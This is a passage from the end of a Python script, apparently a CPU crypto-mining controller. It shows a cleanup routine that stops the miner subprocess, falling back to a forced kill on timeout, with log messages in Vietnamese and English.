    logger.info("🧹 Cleaning up mining processes...")
    with process_lock:
        # **Terminate CPU process** (kết thúc tiến trình CPU)
        if cpu_process and cpu_process.poll() is None:
            logger.info(f"Dừng tiến trình **[CPU]** (bộ xử lý trung tâm) miner (**[PID]** (Process ID - mã định danh tiến trình): {cpu_process.pid})...")
            try:
                cpu_process.terminate()
                cpu_process.wait(timeout=5)  # Wait for graceful termination
                logger.info("✅ Tiến trình **[CPU]** (bộ xử lý trung tâm) đã dừng êm")
            except subprocess.TimeoutExpired:
                logger.warning("⚠️ Tiến trình **[CPU]** (bộ xử lý trung tâm) không dừng êm, buộc hủy (kill)")
                cpu_process.kill()
            except Exception as e:
                logger.error(f"❌ Lỗi khi kết thúc tiến trình **[CPU]** (bộ xử lý trung tâm): {e}")
        
        # (CPU-only) Không còn tiến trình GPU để kết thúc
    
    logger.info("Hệ thống đã dừng. Thoát.")

if __name__ == "__main__":
    main()
